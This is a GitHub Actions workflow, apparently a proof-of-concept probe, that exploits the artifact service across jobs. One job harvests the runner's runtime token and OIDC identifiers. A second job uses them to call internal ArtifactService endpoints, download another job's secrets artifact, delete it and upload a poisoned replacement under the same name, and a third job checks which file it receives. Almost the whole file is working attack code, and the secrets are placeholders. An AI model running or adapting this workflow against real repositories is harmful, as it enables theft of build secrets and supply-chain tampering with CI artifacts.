name: ZeroDayProbe15
on:
  push:
    branches: [main]
permissions:
  contents: read
  id-token: write

jobs:
  job-a:
    runs-on: ubuntu-latest
    steps:
      - name: Grab token + write ORIGINAL artifact
        uses: actions/github-script@v7
        with:
          github-token: ${{ github.token }}
          script: |
            const fs = require('fs');
            const rt = process.env.ACTIONS_RUNTIME_TOKEN || '';
            const oidcUrl = process.env.ACTIONS_ID_TOKEN_REQUEST_URL || '';
            const resultsUrl = process.env.ACTIONS_RESULTS_URL || '';
            fs.writeFileSync('/tmp/ZD_A_RT.txt', rt);
            fs.writeFileSync('/tmp/ZD_A_OIDC_URL.txt', oidcUrl);
            fs.writeFileSync('/tmp/ZD_A_RESULTS_URL.txt', resultsUrl);
            const m = oidcUrl.match(/idtoken\/([^\/]+)\/([^?]+)/);
            core.setOutput('plan_id', m ? m[1] : '');
            core.setOutput('job_id', m ? m[2] : '');
            core.info(`A_PLAN=${m ? m[1] : ''} A_JOB=${m ? m[2] : ''}`);

      - name: Write ORIGINAL secret content
        run: |
          echo "ORIGINAL_SECRET=s3cr3t_token_from_job_a_ABC123" > /tmp/build-secrets.txt
          echo "AWS_KEY=AKIAIOSFODNN7EXAMPLE_ORIGINAL" >> /tmp/build-secrets.txt

      - name: Upload ORIGINAL sensitive artifact
        uses: actions/upload-artifact@v4
        with:
          name: build-secrets
          path: /tmp/build-secrets.txt

      - name: Write IDs for job-B
        run: |
          OIDC=$(cat /tmp/ZD_A_OIDC_URL.txt)
          RESULTS=$(cat /tmp/ZD_A_RESULTS_URL.txt)
          A_PLAN=$(echo "$OIDC" | grep -oE 'idtoken/[^/]+' | cut -d/ -f2)
          A_JOB=$(echo "$OIDC" | grep -oE 'idtoken/[^/]+/[^?]+' | cut -d/ -f3)
          printf 'PLAN_ID=%s\nJOB_ID=%s\nRESULTS_URL=%s\n' "$A_PLAN" "$A_JOB" "$RESULTS" > /tmp/job_a_ids.txt

      - name: Upload job-A IDs
        uses: actions/upload-artifact@v4
        with:
          name: job-a-ids
          path: /tmp/job_a_ids.txt

  job-b:
    runs-on: ubuntu-latest
    needs: job-a
    steps:
      - name: Grab job-B token
        uses: actions/github-script@v7
        with:
          github-token: ${{ github.token }}
          script: |
            const fs = require('fs');
            const rt = process.env.ACTIONS_RUNTIME_TOKEN || '';
            const oidcUrl = process.env.ACTIONS_ID_TOKEN_REQUEST_URL || '';
            const resultsUrl = process.env.ACTIONS_RESULTS_URL || '';
            fs.writeFileSync('/tmp/ZD_B_RT.txt', rt);
            fs.writeFileSync('/tmp/ZD_B_OIDC_URL.txt', oidcUrl);
            fs.writeFileSync('/tmp/ZD_B_RESULTS_URL.txt', resultsUrl);
            const m = oidcUrl.match(/idtoken\/([^\/]+)\/([^?]+)/);
            core.info(`B_PLAN=${m ? m[1] : ''} B_JOB=${m ? m[2] : ''}`);

      - name: Download job-A IDs
        uses: actions/download-artifact@v4
        with:
          name: job-a-ids
          path: /tmp/job_a_data/

      - name: POISON ATTACK - read, delete, replace with poisoned artifact
        run: |
          RT_B=$(cat /tmp/ZD_B_RT.txt)
          B_OIDC=$(cat /tmp/ZD_B_OIDC_URL.txt)
          RESULTS_URL=$(cat /tmp/ZD_B_RESULTS_URL.txt)
          B_PLAN=$(echo "$B_OIDC" | grep -oE 'idtoken/[^/]+' | cut -d/ -f2)
          B_JOB=$(echo "$B_OIDC" | grep -oE 'idtoken/[^/]+/[^?]+' | cut -d/ -f3)
          A_PLAN=$(grep "^PLAN_ID=" /tmp/job_a_data/job_a_ids.txt | cut -d= -f2-)
          A_JOB=$(grep "^JOB_ID=" /tmp/job_a_data/job_a_ids.txt | cut -d= -f2-)

          echo "=STEP1_READ_ORIGINAL="
          SIGNED_RESP=$(curl -s -X POST "${RESULTS_URL}twirp/github.actions.results.api.v1.ArtifactService/GetSignedArtifactURL" \
            -H "Authorization: Bearer $RT_B" -H "Content-Type: application/json" \
            -d "{\"workflowRunBackendId\":\"$A_PLAN\",\"workflowJobRunBackendId\":\"$A_JOB\",\"name\":\"build-secrets\"}")
          SIGNED_URL=$(echo "$SIGNED_RESP" | grep -o '"signed_url":"[^"]*"' | cut -d'"' -f4)
          echo "GetSignedURL cross-job: $(echo "$SIGNED_RESP" | grep -c signed_url) urls found"
          if [ -n "$SIGNED_URL" ]; then
            curl -s -o /tmp/stolen.zip "$SIGNED_URL"
            cd /tmp && unzip -o stolen.zip > /dev/null 2>&1 || true
            echo "STOLEN_CONTENT:"
            cat /tmp/build-secrets.txt 2>/dev/null || echo "unzip_needed"
          fi

          echo "=STEP2_DELETE_ORIGINAL="
          DEL=$(curl -s -w "\nHTTP=%{http_code}" -X POST "${RESULTS_URL}twirp/github.actions.results.api.v1.ArtifactService/DeleteArtifact" \
            -H "Authorization: Bearer $RT_B" -H "Content-Type: application/json" \
            -d "{\"workflowRunBackendId\":\"$A_PLAN\",\"workflowJobRunBackendId\":\"$A_JOB\",\"name\":\"build-secrets\"}")
          echo "Delete: $DEL"

          echo "=STEP3_CREATE_POISONED="
          # Create poisoned artifact in JOB-B's own namespace with SAME NAME
          CREATE_RESP=$(curl -s -w "\nHTTP=%{http_code}" -X POST "${RESULTS_URL}twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact" \
            -H "Authorization: Bearer $RT_B" -H "Content-Type: application/json" \
            -d "{\"workflowRunBackendId\":\"$B_PLAN\",\"workflowJobRunBackendId\":\"$B_JOB\",\"name\":\"build-secrets\",\"version\":4}")
          echo "CreateArtifact own ns same name: $CREATE_RESP"
          UPLOAD_URL=$(echo "$CREATE_RESP" | grep -o '"signed_upload_url":"[^"]*"' | cut -d'"' -f4)
          echo "UPLOAD_URL_PRESENT=$([ -n "$UPLOAD_URL" ] && echo YES || echo NO)"

          if [ -n "$UPLOAD_URL" ]; then
            echo "=STEP4_UPLOAD_POISON="
            # Create poisoned zip content
            echo "ORIGINAL_SECRET=POISONED_BY_JOB_B_XSS_ATTACK" > /tmp/poisoned-secrets.txt
            echo "AWS_KEY=POISONED_AKIAIOSFODNN7EXAMPLE_EVIL" >> /tmp/poisoned-secrets.txt
            cd /tmp && zip poisoned.zip poisoned-secrets.txt
            # Upload the poisoned zip to the SAS URL
            UPLOAD_HTTP=$(curl -s -w "%{http_code}" -o /dev/null \
              -X PUT "$UPLOAD_URL" \
              -H "x-ms-blob-type: BlockBlob" \
              -H "Content-Type: application/zip" \
              --data-binary @/tmp/poisoned.zip)
            echo "UPLOAD_HTTP=$UPLOAD_HTTP"

            # Finalize the artifact
            FINALIZE_RESP=$(curl -s -w "\nHTTP=%{http_code}" -X POST "${RESULTS_URL}twirp/github.actions.results.api.v1.ArtifactService/FinalizeArtifact" \
              -H "Authorization: Bearer $RT_B" -H "Content-Type: application/json" \
              -d "{\"workflowRunBackendId\":\"$B_PLAN\",\"workflowJobRunBackendId\":\"$B_JOB\",\"name\":\"build-secrets\",\"size\":\"$(wc -c < /tmp/poisoned.zip)\"}")
            echo "FinalizeArtifact: $FINALIZE_RESP"
          fi
          echo "=POISON_COMPLETE="

  job-c:
    runs-on: ubuntu-latest
    needs: job-b
    steps:
      - name: Download build-secrets (victim - expects original, gets poisoned?)
        uses: actions/download-artifact@v4
        with:
          name: build-secrets
          path: /tmp/downloaded-secrets/

      - name: Show what job-C received
        run: |
          echo "=JOB_C_RECEIVED="
          ls -la /tmp/downloaded-secrets/ 2>/dev/null || echo "DIR_EMPTY"
          cat /tmp/downloaded-secrets/*.txt 2>/dev/null || echo "NO_TXT_FILES"
          echo "=END="
